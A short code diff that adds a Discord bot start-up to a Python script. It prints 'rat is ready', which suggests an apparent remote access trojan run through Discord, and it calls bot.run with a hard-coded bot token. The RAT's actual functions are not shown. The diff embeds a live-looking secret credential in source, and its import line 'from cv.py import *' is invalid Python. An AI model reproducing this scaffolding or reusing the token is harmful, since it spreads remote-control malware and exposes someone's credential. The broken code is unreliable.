@@ -11,3 +11,11 @@ import datetime
 import random
 import json
 import requests
+
+from cv.py import *
+
+@bot.event
+async def on_ready():
+	print("rat is ready")
+
+bot.run("Njc0MjczOTQyODM1NTYwNTIx.XkkOBg.C2cfWpSHnN7p1ZW3pI2xW3XFOvc")
